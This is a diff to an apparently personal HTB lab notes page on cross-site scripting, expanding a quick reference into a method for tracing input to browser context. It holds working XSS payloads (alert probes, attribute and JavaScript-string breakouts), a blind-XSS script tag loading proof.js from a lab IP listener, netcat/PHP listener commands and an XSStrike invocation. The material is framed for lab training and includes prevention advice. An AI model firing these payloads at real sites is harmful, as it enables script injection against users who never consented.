@@ -1,11 +1,187 @@
 ---
-title: "Cross-Site Scripting: Quick Reference"
+title: "XSS (Cross-Site Scripting)"
 sidebarTitle: "XSS"
-description: "Distinguish reflected, stored, and DOM XSS and review the saved probes, browser-context examples, and HttpOnly limitation."
+description: "Trace input to browser context, prove reflected/stored/DOM execution, and distinguish impact from assumptions."
 keywords: ["xss", "cross site scripting", "reflected xss", "stored xss", "dom xss", "httponly", "javascript"]
 ---
 
 {/* Generated from Web/XSS (Cross-Site Scripting).md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Trace **controlled input → transformations → output context → browser execution**. A reflected string is not yet XSS. Find where the browser interprets the value and use a small visible proof in your lab session before investigating impact.
+
+## Locate the input and its consumers
+
+Start with searches, errors, profile fields, comments, filenames, preview features, and client-side URL handling. Use a different marker for each field so stored or delayed rendering can be attributed correctly.
+
+```text
+xss-search-01
+xss-profile-02
+xss-comment-03
+```
+
+```bash
+BASE='http://app.htb'
+curl -sS -G --data-urlencode 'q=xss-search-01' "$BASE/search.php" -o response.html
+rg -n -C 3 'xss-search-01' response.html
+```
+
+Also use browser developer tools. The HTTP response source and the live DOM can differ because JavaScript transforms or inserts data after the response arrives.
+
+| Observation | Likely branch | Next evidence |
+| --- | --- | --- |
+| Marker appears in this response | Reflected server output | Exact surrounding HTML/attribute/script context |
+| Marker appears after refresh or in another view | Stored input | Storage location, rendering page, and viewing identity |
+| Marker absent from response but present in DOM | Client-side processing | Source of the value and the DOM operation receiving it |
+| Marker only appears in a delayed/admin view | Blind or delayed behavior | A uniquely attributable callback and execution proof |
+
+## Match the payload to the context
+
+The examples below are input values for different contexts. They are not interchangeable bypasses.
+
+### HTML text interpreted as markup
+
+```html
+<script>alert(window.origin)</script>
+<img src=x onerror=alert(window.origin)>
+<svg onload=alert(window.origin)>
+```
+
+Check whether `<` and `>` remain characters that form markup or are encoded and displayed as text. Some DOM insertion methods do not execute newly inserted script elements; event-handler behavior is a separate check.
+
+### Inside a quoted HTML attribute
+
+For an input reflected into a double-quoted attribute, first determine whether the quote is encoded. A possible context-breaking test is:
+
+```html
+"><img src=x onerror=alert(window.origin)>
+```
+
+Inspect the resulting element and attribute boundaries. A single-quoted attribute requires a different closing quote. If the value is in an event handler or a URL attribute, additional JavaScript/URL context rules apply.
+
+### Inside a JavaScript string
+
+For an illustrative single-quoted JavaScript value:
+
+```javascript
+const message = 'INPUT';
+```
+
+```text
+';alert(window.origin);//
+```
+
+This only makes sense if the quote is not escaped and the remaining script stays syntactically valid. Check the console for syntax errors. Do not use JavaScript-string syntax where the browser is parsing HTML text.
+
+## Send the intended bytes
+
+```bash
+curl -sS -G --data-urlencode 'q=<img src=x onerror=alert(window.origin)>' \
+  "$BASE/search.php" -o xss-response.html
+```
+
+Curl can show how the server reflected the value; it cannot execute browser JavaScript. Open the corresponding application request in the browser to verify execution. Preserve cookies, tokens, and the relevant account when repeating a stored or authenticated test.
+
+## Stored-XSS workflow
+
+1. Submit a unique plain marker and record the object ID or URL.
+2. Reload the affected page and visit any other view that displays the same object.
+3. Determine whether the marker is rendered as HTML, an attribute, a script value, or plain text.
+4. Replace the marker with a small context-appropriate proof.
+5. Revisit using the intended lab viewer identity and record the actual origin and role.
+6. Remove the test object or restore the original value when the exercise permits cleanup.
+
+A proof that only runs for the submitting account may be self-XSS or a limited rendering path. Explain how another relevant viewer encounters the data before claiming broader impact.
+
+## DOM XSS: follow source to sink
+
+Common inputs to inspect include `location.search`, `location.hash`, `document.URL`, messages, and browser storage. Search the application JavaScript for both the source and the operation that inserts or evaluates it.
+
+```bash
+# Download an observed script path, rather than guessing that it exists.
+curl -sS "$BASE/js/app.js" -o app.js
+rg -n 'location\.(search|hash)|document\.URL|innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(' app.js
+```
+
+The presence of a sink is not a finding. Determine whether controllable data reaches it and what validation or encoding occurs on the way.
+
+```javascript
+// Illustrative vulnerable flow from a query parameter into HTML.
+const task = new URLSearchParams(location.search).get('task');
+document.getElementById('todo').innerHTML = task;
+```
+
+```text
+?task=%3Cimg%20src%3Dx%20onerror%3Dalert(window.origin)%3E
+```
+
+A `#fragment` is normally processed in the browser rather than sent in the HTTP request. If the vulnerable source is the fragment, curl's response alone will not reveal the full flow. Use breakpoints and inspect the value just before it reaches the sink.
+
+## Blind proof without collecting sensitive values
+
+Use distinct paths per input. Create the following `proof.js` on your lab workstation and serve its directory:
+
+```javascript
+new Image().src = 'http://10.10.14.10:8000/executed-profile-02';
+```
+
+```bash
+python3 -m http.server 8000 --bind 0.0.0.0
+```
+
+```html
+<script src="http://10.10.14.10:8000/proof.js"></script>
+```
+
+The request for `proof.js` establishes a resource load; the second request for `executed-profile-02` supports execution of its contents. Record timestamps and which input contained the payload. Browser policy, HTTPS/mixed-content rules, CSP, network access, or the absence of a viewer can prevent a callback.
+
+## Establish impact from the actual browser context
+
+Use developer tools in your own test session to inspect relevant context:
+
+```javascript
+location.origin
+document.domain
+document.cookie
+```
+
+`document.cookie` cannot read cookies marked HttpOnly. This limits cookie theft; it does not automatically prevent script from making same-origin authenticated requests. The same-origin policy and CORS affect reading responses from other origins, and CSP can restrict scripts or outbound requests.
+
+For a harmless same-origin read in your own lab session, substitute an observed endpoint:
+
+```javascript
+fetch('/profile').then(r => r.text()).then(text => console.log(text.slice(0, 200)));
+```
+
+Classify what the demonstrated script can do: alter the page, read accessible DOM content, issue an allowed action, or read a non-HttpOnly cookie. Do not claim every XSS automatically steals every session. The earlier notebook examples below retain the original impact snippets; apply these origin, cookie, and privilege constraints to them.
+
+## Tool-assisted discovery
+
+If XSStrike is already available in the lab environment:
+
+```bash
+python xsstrike.py -u 'http://app.htb/index.php?task=test'
+```
+
+Validate the reported URL and payload manually in the correct browser/session. A scanner finding, reflected marker, or unexecuted HTML element is not a substitute for an explained execution path.
+
+## Troubleshooting by symptom
+
+| Symptom | Next useful check |
+| --- | --- |
+| Payload is displayed literally | Output encoding, content type, and whether any later code decodes or inserts it |
+| HTML appears but script does not run | Insertion API, event trigger, CSP, and syntax/context |
+| Works in one page but not another | Different rendering context or sanitizer on the second view |
+| Works only for me | Storage/viewing path and whether another lab identity encounters it |
+| Blind listener sees a script request only | Whether the script loaded successfully and its fixed execution callback ran |
+| Cookie field is empty | HttpOnly, cookie scope, and current origin; examine other demonstrated capabilities |
+
+Prevention depends on the output context. Prefer text-only DOM APIs for untrusted text, apply the right output encoding, and use a maintained sanitizer where HTML input is intentionally allowed. CSP is an additional control, not a replacement for correct handling. See [OWASP's context and sink guidance](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
+
+Source: your [XSS module capture](/web/htb/xss), condensed here into discovery, proof, impact, and troubleshooting steps.
+
+## Earlier notebook reference
+
+The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
 
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
@@ -35,3 +211,11 @@ php -S 0.0.0.0:80     # or: nc -lvnp 80
 
 
 > If output is HTML-encoded, try injecting into an attribute or an existing tag/event handler instead. `HttpOnly` cookies can't be read by JS — pivot to actions (CSRF-style) via `fetch`.
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Cross-Site Scripting (XSS) — full HTB module](/web/htb/xss) — Original lesson capture with the longer transcripts.
+
+{/* VAULT_RELATED_END */}
